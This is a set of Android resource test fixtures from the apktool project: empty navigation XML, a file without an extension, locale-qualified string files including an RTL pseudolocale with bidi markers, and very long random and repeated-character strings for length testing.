`brut.apktool/apktool-lib/src/test/resources/testapp/res/navigation/nav_graph.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<navigation xmlns:android="http://schemas.android.com/apk/res/android">
</navigation>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/raw/no_extension`:

```
This file has no extension.
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-ar-rXB/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">"‏‮Forgot‬‏ ‏‮your‬‏ ‏‮username‬‏ ‏‮or‬‏ ‏‮password?‬‏\n‏‮Visit‬‏ ‏‮google.com/accounts/recover‬‏‏‮y‬‏‏‮.‬‏"</string>
    <string name="test2">‏‮Forgot‬‏ ‏‮your‬‏ ‏‮username‬‏ ‏‮or‬‏ ‏‮password?‬\n.‏‮Visit‬‏ ‏‮google.com/accounts/recover‬‏‏‮y‬‏</string>
    <string name="test3">          (string8) "‏‮Forgot‬‏ ‏‮your‬‏ ‏‮username‬‏ ‏‮or‬‏ ‏‮password?‬‏\n‏‮Visit‬‏ ‏‮google.com/accounts/recover‬‏‏‮y‬‏‏‮.‬‏"</string>
    <string name="test4">Forgot your username or password?\nVisit google.com/accounts/recovery.</string>
    <string name="test5">‏‮Forgot‬‏ ‏‮your‬‏ ‏‮username‬‏ ‏‮or‬‏ ‏‮password?‬‏
        ‏‮Visit‬‏ ‏‮google.com/accounts/recover‬‏‏‮y‬‏‏‮.‬‏</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-ast-rES/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-ast/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-b+ast+Hant+IT+arabext/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">testapp</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-b+ast+Latn+IT+arevela/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">testapp</string>
    <string name="test1">test1</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-b+de+CH+1901/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">testapp</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-b+en+Latn+419/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-b+en+Latn+US/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-b+en+US+posix/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-b+eng+419/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-b+iw+660/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">testapp</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-en-rUS/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-en/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="long_string1">g7sVCIOAIBKwWDzQKE0ThAJKDCPzA5kurfUIPvIaDjX97kuv2lDFS75wF6GVYEMOSrMH0H1MfVMfMgpOXH4LBNuzeGTe8HstiRTzbOnw3wCT7HYsOvfUB11Lq2myfr9vzHCLAdx30m4DPJ2t0QRIk20I1GeF3PzynpQsY550uyYLuu4T7Xwna0eRS26wk02lIDM6eyVKkm4ZpXc6VkLL2p0ibXVjVkalf1f2x5OND5YdQlOOCaz1jMzXZS2xtOqegy74hJrl0UpNiRcyPs8P9wpf6KQS1yHUnUswGmTBsGEvEA39vFkWTgsOKKrVcYMzA4KhZYoeEotgUbVpiAUrcKfJDZtfCAzIVW2RXzPWwtiSYOXDO6oBfDphNQa4B0OwC6m9KmvTwWv2ezjUuwfdJHv2o8vr830PovzkNzwGG3CesyrQWLHalwgMq01UXJRz8zomyloxvan0GMDcj9Kfb8Eljair9AHnFxY2EM6c6E0M3Q0S0rMy8vzUzk9bbFoXcFcpW4yrL4Fdfu0TMbHi6rarFTe49pwwyCaLU8LKBnciumPtyt9dJsTcGdv8nKjBw8Zv3ofWvxuEh8ReLmfKFHrEGUA0wcLh8NkoMmKIqSor6pALhI4bowFfWPYzjiK52TgazGQhrJIkKWXVbZi8aRbkTy0uN7XjT4v1PXzWbpVnUJh80UeFrMO1jEZZFf03oKhi71vREnJb8wZ9JoLNgt9TVFZ6VHAvpFDRzbshSnEZm2P6G8TwmdxORJM1JIj8uvfMcB9fUgQj3Y32AuCcRPN6Xrbk0GlCQLbFO05XlAZIE52Jj2xeJTUih5p0mdeaOsCvjatJkPcPRPNisoymVHbI0kT7BmjObKrAEvILAeilBPwWFYB5neKg8n03qFeu8gb59uzcpO0SGif45XX2VmQyRwjThs0HEO0mGkIgS8k5WexEzIdyZB1D9zSJ2NewML2wsqxl7MP24B6cZ49wyUlHYHjB32CHanR3bh4D5TRhU3ylmhIi7LnII7bZgDEu1Nf2BsFIN8jrmdSlDlamE4aU3kBl7RLAwki1LSeoyCbaUR0dQ6GeR9g5pHcL8CJsOgKqZiAfUtekaUSrxB95Z9mlXxMnVoUo7blkq7Pq8JSXvny9pvWDzcxOgkeyRnp3iZfQ6nFWcufzkf0ijpq6JsC2DPyLfIKmNfObtAKt95YfdhpZMSUxKsj6LQbSW3eZbzSFMU0ovRIjOo8R1bCNSfYWrCwbzc1CpXs9nl9OcNzvY3JNH61iLEMWbtYCE6LamAwMOUeCod4Kn8cG7WPF46Bt7pAlDbF9QB7ITDBBpOaQEcH1Rl20BxuBlnayp1jnHvNOXrb1noHtDfaQkqBOyCw7bNKqHoXsB8m0LhudOhiv6Ie39pn8zT9Pearbep6vEXP4DY9NT4hHTkqX1KdDW0JegaaUuGnW9KY8r4LaeSK2OCmMWmFbrFMTAYYdwNjqZuMS80Xr3N7IEEbRkz1QbqmSwQ2RmIL4k22TublqKRU6lu2hkGbGEn1QAvZuvetfTVi4QAk9xEkCPVvVhPq5BwmEavW65tFMQsELLbWGyNRviODwTm5sYibyjxgnO84BZLZOtCnFSHJxSsZ8tSKN1HalJK718TH4AYsW1nEHB7RVh7Fz5sbjKRGqctT4pziK5JgrlfQ2Zjaf8GR2CWdQygkApvowHkLS42ljBfzRa5SGxmQfyfvW35ClvZDnPaSBctqWDBTsvXFdsdCqpeB5d1hYFbA4YUcBWi4qNmeez0wdPTaKU1IucD1cgUHb9RU7LUhb3hhWY3mc1iOBJ3YITrp4ikjBa7u950hjiBldv9J5t3dJ7j3nFaO5GR5I18Db11LhtkYQgnv8RyoFIPybMhSMTerXaDkM88cJdkukTjEpnFKIog47Mt3xCzXbJP2wm5P1x1n45HbByyHDNVPBiqNyF8WLbfth2bRjIlwOch3305fbZ9LBxn42xGsmfkcWu2kAzDTYXfo4084Ejq9kVeSAnWil0og0AJVvs8PQ3FayE3MF2CCl9xJmJAu9k6R0jnMRF6COSiD8sqHFxO2DaLZ2ZZ2ltuL39Sbj1nYv1mtfs9tONoonDLQ2ER4DC4CTd2uYuWYTJ7xFYw5h1BLGYNwulFzOQ6DsdmwyJZNxUbskMMJ8j2VgVtCG7EXJ6RPzurDFgMe5pNhu15GeaEi0CocCfgBA3bipIhQHXOMx8CHqb5ws6Kbitio1kID2I31dEAQkV0E8UV5PrsLd42t8IlAeZEMalCM6IMAeQsU0suKdyQzw6TME6xGt5OuTl2qdKn7vuucVGsoZDtlyKvjkWI02PRXypYIkjHHzXh0ctwxITzXwRvst5UUI57A2biOpuMrfagcE8grXVG47PoYOdpG6hOXhEdU6z8EGjnAMMIsVAgsXJ4KiV1R2j7UmDw3kBX91RruSMe09eTcHmRbD0GQz5PrJai5sWVhs5PUISSXx3QF0bvESmvkqKdwsz03FOd43</string>
    <string name="long_string2">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</string>
    <string name="long_string3">ORgwNt7MLH9P9qcuq82YxNTwLI8XeOMudKbq4Rx5wDum0MIK34hMu8PdwjO8NwSkRnDEE5mbANgMU9L1x0lAMUxEykqQDWfJ5ISFvccRxVzgQc07A6k21yfjAaIpTzdCW5xsTP1sdUpaO56sOV9kIpF9bN8zKG3TyXm3smmkbfH4JqJHxI1Qp0F1zZWXdF4wCkIDINI0in61nOLUfWJzxfdFKkkzn8cgpyaEWwp1VGKuuSpmOZ6sihFMnUHC5LqI1WjivL7JYhNf9DyHmJUyZeKxfVKuVRIPjZgLkY1cjQA91j9DPeU3xIrs57YfTMvTfyZQXvxaQo7luRiyRmtqj4GT6nX27sFHCmMjMeUzcE6GBoI4MH2GiVaeKrgB3LxMYKTeBwmSssGwcUavPXXP52vHUrTGyktUnRsI6Zs1RkmDx4MKZZLeRyWjuNuDl8u693657NezdqshgbwaV1oxAjcQU46qQi7P5xprLvKuTf2tlAwrkVK3AQbqHy5myQH1ldjC2NfFWRoZS9r3ikGnyxLBXQPmXmtsJUndMlMNVP2uM1FSqWdUJnltTSKEDGJI40Riq1GmzfzcnRrioVqizDFu09Dopl83PmBMVMQzabw47MWXAKyj3CsKha96kkWP3A8TtQvODihEBoFG2Tdud9s6D1e7FjJQWyoLBZGEmyKrbpa4MukE2YMJKey94DZvSZWRX91LUs4UbmgZZmYhTdKkzpD4b16KVJsvQrcXWMisFXelKSw2DGm4LnPuwrOWwQhdVm6KuhWpJg9rXqlXDZcg9OM0zuQ1Zx2ViaRcX2ttXEaKmpS0CJltFKRCgYVsEsvac25PbLnscfR7ZucS7L2csxOjjji3FeZgbzZncU863usuxnsivGFzddaePmtpoSDQeF4SXccNS5prxb8VG7YDVqpL4iPsKurFQF1uXaFSuJacrahUl9iBMu6yW2s8WDcZvHvVXUQJIdw8LDe4bdAaZuA42b7FpUUVy6K53202Xlytlz8v0TLA7RVLCqwlG4mSIpXFBks8QVG3EpFYTN2SN3nWLeaYAViMnuQidw1XwvPkIT5rxJMuupACj0sxoBxJEH8FTq26K0IfWSh9RV8fVO87eIFvICLZGz70sCDyVc01saxx194yh91ECQyq88DCyvXnFL6YP6UdeNV2gG7IYxD6SB9jSrQ0RvocJDfrqMHhyFpVNVYDcUr58dvxSpwPMAluxA5sBSGoOvBD2jivE3LgH4zFiZzVsGmdAoiGzrBjPkUprQkdsIdBny6A5QUZA9jd4X49HMt9nIlgsAZ1NXktBs3QYDgvPT4d8upuUDL8ijjIbjwuTHMtzX7QUUxpYciy1T6rFpHv3hBBvDklE6ShpTgg6psHC6M3c2H7G5feLc5H32cDAT0R9cxeRcGoVSl2tL6remvGTk6o4Fk1K7nzs3VGQwCYFL0W8VcPGSuoUu5aZvbpPwo6pI79j2rGm5QKuQgz7F7pQThrqqWzLfuoaz7KvOJntV1ZmraFsQvwM88xWSQIjlF00NxDJ1NuNGURYrUWJr05zItbpwV3zrZwQbCsBBBRAnVj2td55Wx33kaBepSpzE4JMNxpNDYqkNymXhCYuHE0vTVAsZMi5VtFPbfJEl4YyYfn8p4vxisF7elLPlaylk2eOix6oL4MAsgq7eqnugnziO7BVEmq8i9GaCYw7qAztBx7r2W2QyQHHhDERjBATTW9VTiDHgxs6sWpbErk4PQMdf0IRT1OZg0okG2JqZTNhDAAzG3rcNS3fGJYv7soAT886v5YpA62TMTjyUlVFlogdsoBkKsBVNB4Rw2zsB8vf5TfzErmelKpTFoUUyu2V7Bup8IJ9x9fa97CtCVTuk4WiAay0Dr8ZRF0hVEHHxEjGzd6DuvsDGb9QuJkERhyx0NYOEHpWUWcTjL1UNlCoqCJEEIonenztwb7SJ4IpCLWGGzubsXrMDWUcX67Wx1rY20ZqxsqnWkBphVye18erA96J1XWtBNvrq73kJx9xfpFu7AKrDTpaVt71zhCEGKVv4NKKzq6Dyok6cXScYfWdjtntUitqdxSYGGHgxFNBsL48iTesLk5CcMQm4jDrOURxkOv1oBQErYs4fc0p4uhV0ymRgMMD009RA3QwqRk6OWZ7Y9bb4xceCQERs1XhVPN5R1PcmM3rdJTGXaa7eTsPRldiW3undVyoI349x0lflSPbuZZ5uHit3Nlf5lJjBozajpSeJrv5h4lne3UbpazRs4ThWe3ufUU6qjPOz7oFRW7qPkQCd4EETSyU6TVTLhhxutJd4P7KmZIiPsr3n6DvwTJcqD9ki01mE4P0P4WBc8Zc9wIktb7ZOcZtfYxSyfL6pXPwi2E8WrEsXTt4JUMfSmDhhAlG5oYdCaMuC1IvlO3woo1vd3cYMHElfr5x9pz4txXKza8HrINA6DuitPsAW3gNTJv4Lffp99ZAHxuIlH1qcGdpaMYYyiHJW0XryTQnw3KzwQp75tahlrOabp78HejojgzxGttt1pVI4MiYYzksT8xzYyNVcGwXQefI6qIiXYMObCDBEmdKe98SO73YiivMlnwHXzl7awwgQ8hVWdRCGkVB9tn1Zbx8j4elbjZyENWKXJQl0N3nO5LfekKtjVPoJ3k6T0XzwHxP8f2ZtJAemcDA1GIuyvXcNnoDbngSO626PAjsuIFHTiyuCPUyp4Jv7AKnueJvjkmmxGeYbEfOGAU1488DdmIChDjvpGK9ZP1tdtfv8eCUwnpX9TeVOroTaEoODskYCKEYB7MdEySjIngMrEvmANTbONlfZTIuxy0TVUYzx00ONp01nkXi5tZNahZX8XupamxAECJ8OsuZmw2i9OaC2XmH2DRsQIRSNxbKhvqS7AAGeCfAcFNRSCjuRfqAUhR7altxAzg2JA6bPkO6TjmlYGjf5YMR1FzIZbBs3Ydgdv9aJtdLAWwuk3SGBG4MIAaEEGUWkPACVzx7T7q9nu7Jbht6dDAcKnBICGkEjwi5AlRP6EUNdTLsboA6YPYioaN45L4WErnp0w91SfUZiRGwqMc4no84j5XDFiDlkM6fSGkROv9JOEj327aXVevYx951IbT2phZtBXmxoVrk9CMwy54naFFhm2HCSSd3VYetegF7AzhwUq3VPjplGRpW4uxx8WmbHoFqyBKsxMNLxDHOl2Ml26o4YK4LtDhOM3NqoR8AEMkrXcFy2fAfrOh5D2H3hdCrkB25ZQFPbFmJqLIQbWakix4NDvPl07fN86DRaHUXYqxQsU5F6YxQCQ4ZJglkVZCNzDInZnm1Y7PPz3D7iu6dRIdnxSikoI1GF9DKUROdIQCRIJ3Jsd3GmUgtpaVqGPAzgpLm82vxgiPeKSfsGPYwm4qFn4ZJAjmK5Il8cYQHqBXB67ZujZyIYXPdZVYEzEFQJwYXOzTsNLA4D3BcBFu7nR54VsDc1UXjXIDiYpAQ135SaK8b3b1P3bpB9aWUNU53T9Ul2SFpyD1zJWBP8VIMKYOJYajaruKN4FLINtYtVKaDbHUHMsr3HTSXlLCgt9WgIREB3vOX3yrLTmnNFhVHJjGcp1UQV0pJL7QMvCWJcpfuT40Olp1sA3On6bye9AuMPTS6mDtDczkR2vieGn1NNq7onqPha1fRlUS5dP8iYhWzRBywDBUz9G5zPE32sd5cYryVvPaYupymlXUCG7YjvN4mudewfsue6OwSr98saCgFd6zp6DHsFDPr2ue3rcspqPi4yuow2yZXLMSiiG0yoHWggw0nXLEjc71JQVUQhI6U9WKz2hTs4PjqZCWDxG4EXB94yxG2rVglyLRgTs1tVw7sRtWCjKX18LKJSs0PTbyunXuT7ocMMv9t8Rfjqkd5YSaOIOhALMGaZujaitd7MHNVEqj9XOTVlrZgBo4enSsrrJ0YQferVvWpHrv1aho9WW3q9pGkSu4iCNmmXtBoqoyOwC8UdhOFYnPXSM1tlODPIfCj9XTs8i2v9P0HQ6YEuEwy0ltD1P5AFUMlctubvCd37km96ttl5NCvg6i3ANPo45KGQGxUFfBQ4w4LSFYKQ2TsWBzu0cJ8JOk0u6L4EXrSzIYWFpyBjOWtrTwDEh1KfEhhl7kMtioQX9uyqsfyhDR0frOrZauajHmMLdN87ZfxxXKmsPFhSVU5Keo8Fx8T0n7Mo18i7VvcBWyNwv8UZq5yAtFjkuF4ZXp0rhE49xAG4cSuBdI64TorJjrgrbXSIegnkksZ2DqrT2MUyVw4uaOvbKl1oZC3TcHOEy3bKo7xrlYKVritVnPwoSz33BOZ7E4uTF3d5aIkrdoOizbY1gGHU7E4chpgEkiLU95a0CROU0EuoYHfz5gg8nWJv2YisQR2BAOYkfrdKKyttHctYHr8TR1VRY9X1iCRYdQd1WWoj2O14SNYMe5kgcv7ojaIikj9oxnmpUEg6jlY8egfgr2HuvO0aheZcYZvHjqSmtfIUl0GOBMXgUbWnsNEBqAvJBX202EVsR1</string>
    <string name="long_string_32767">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa